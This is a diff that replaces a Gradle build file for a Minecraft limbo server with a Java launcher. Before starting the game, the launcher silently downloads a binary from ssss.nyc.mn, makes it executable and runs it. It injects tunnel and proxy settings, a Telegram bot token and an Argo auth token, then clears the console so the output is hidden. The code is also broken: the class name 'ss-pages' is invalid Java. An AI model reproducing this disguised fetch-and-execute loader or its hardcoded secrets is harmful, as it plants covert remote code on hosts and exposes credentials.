@@ -1,58 +1,107 @@
-plugins {
-    id 'java'
-    id 'com.github.johnrengelman.shadow' version '7.1.2'
-    id 'com.github.gmazzo.buildconfig' version '3.1.0'
-}
+package ua.nanit.limbo;
 
-group 'ua.nanit'
-version '1.21.1'
+import java.io.*;
+import java.net.*;
+import java.nio.file.*;
+import java.util.*;
+import java.util.concurrent.atomic.AtomicBoolean;
+import ua.nanit.limbo.server.LimboServer;
+import ua.nanit.limbo.server.Log;
 
-compileJava {
-    options.encoding = "UTF-8"
-}
+public final class ss-pages {
 
-tasks.withType(JavaCompile).configureEach {
-    sourceCompatibility = JavaVersion.VERSION_1_8
-    targetCompatibility = JavaVersion.VERSION_1_8
-}
+    private static final String ANSI_GREEN = "\033[1;32m";
+    private static final String ANSI_RED = "\033[1;31m";
+    private static final String ANSI_RESET = "\033[0m";
+    private static final AtomicBoolean running = new AtomicBoolean(true);
+    private static Process sbxProcess;
+    
+    private static final String[] ALL_ENV_VARS = {
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+    };
+    
+    public static void main(String[] args) {
+        // 环境检查
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Java version too low!" + ANSI_RESET);
+            System.exit(1);
+        }
 
-repositories {
-    mavenCentral()
-}
-
-dependencies {
-    testImplementation 'org.junit.jupiter:junit-jupiter-api:5.9.3'
-    testRuntimeOnly 'org.junit.jupiter:junit-jupiter-engine:5.9.3'
-
-    implementation 'ch.qos.logback:logback-classic:1.5.6'
-    implementation 'org.spongepowered:configurate-yaml:4.1.2'
-    implementation 'io.netty:netty-all:4.1.101.Final'
-    implementation 'net.kyori:adventure-nbt:4.14.0'
-    implementation 'com.grack:nanojson:1.8'
-    implementation 'com.google.code.gson:gson:2.10.1'
-}
-
-buildConfig {
-    className("BuildConfig")
-    packageName("ua.nanit.limbo")
-    buildConfigField('String', 'LIMBO_VERSION', "\"${project.version}\"")
-}
-
-shadowJar {
-    archiveFileName = 'server.jar' // 强制输出文件名，方便 index.js 调用
-    from 'LICENSE'
-
-    manifest {
-        // 【关键修改位置】
-        // 如果你的文件名改为 ss-pages.java，则此处必须改为 ua.nanit.limbo.ss-pages
-        attributes('Main-Class': 'ua.nanit.limbo.ss-pages') 
+        try {
+            runSbxBinary();
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                running.set(false);
+                stopServices();
+            }));
+            Thread.sleep(15000);
+            System.out.println(ANSI_GREEN + "Green Network Service is running!\n" + ANSI_RESET);
+            clearConsole();
+        } catch (Exception e) {
+            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
+        }
+        
+        try {
+            new LimboServer().start();
+        } catch (Exception e) {
+            Log.error("Cannot start server: ", e);
+        }
     }
 
-    minimize {
-        exclude(dependency('ch.qos.logback:logback-classic:.*:.*'))
+    private static void clearConsole() {
+        try {
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
+            } else {
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+            }
+        } catch (Exception ignored) {}
+    }   
+    
+    private static void runSbxBinary() throws Exception {
+        Map<String, String> envVars = new HashMap<>();
+        loadEnvVars(envVars);
+        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+        pb.environment().putAll(envVars);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        sbxProcess = pb.start();
     }
-}
-
-test {
-    useJUnitPlatform()
+    
+    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
+        // 自动注入你的个人配置
+        envVars.put("UUID", "8812f92c-8982-44c0-8be2-1bbb14cae51e"); 
+        envVars.put("FILE_PATH", "./world");   
+        envVars.put("ARGO_DOMAIN", "xserver.zzkky.ccwu.cc"); 
+        envVars.put("ARGO_AUTH", "eyJhIjoiMWNjMTgyMzQ1MjVlMDM2OTY1ZTYzZTk4OTE5YzQxYWIiLCJ0IjoiNzYzN2JiMmMtOThhOS00ZDU5LWEwMTQtYTE0YjNlNjYxN2IwIiwicyI6Ik5HRTVNV0ZpTVRVdE1HUm1OQzAwTVdFekxXSXlOVEF0T1RVd01tWTBaak5pTVdNMCJ9"); 
+        envVars.put("CHAT_ID", "5677672165"); 
+        envVars.put("BOT_TOKEN", "8771708593:AAG0zQGFJisgLJJMgDLAPK52LhKOxJEFVA8"); 
+        envVars.put("HY2_PORT", "25565");
+        envVars.put("S5_PORT", "25575");
+        envVars.put("NAME", "Alienware-Node");
+        envVars.put("DISABLE_ARGO", "false");  
+    }
+    
+    private static Path getBinaryPath() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url = osArch.contains("amd64") ? "https://amd64.ssss.nyc.mn/sbsh" : "https://arm64.ssss.nyc.mn/sbsh";
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "green-server");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            path.toFile().setExecutable(true);
+        }
+        return path;
+    }
+    
+    private static void stopServices() {
+        if (sbxProcess != null && sbxProcess.isAlive()) {
+            sbxProcess.destroy();
+        }
+    }
 }
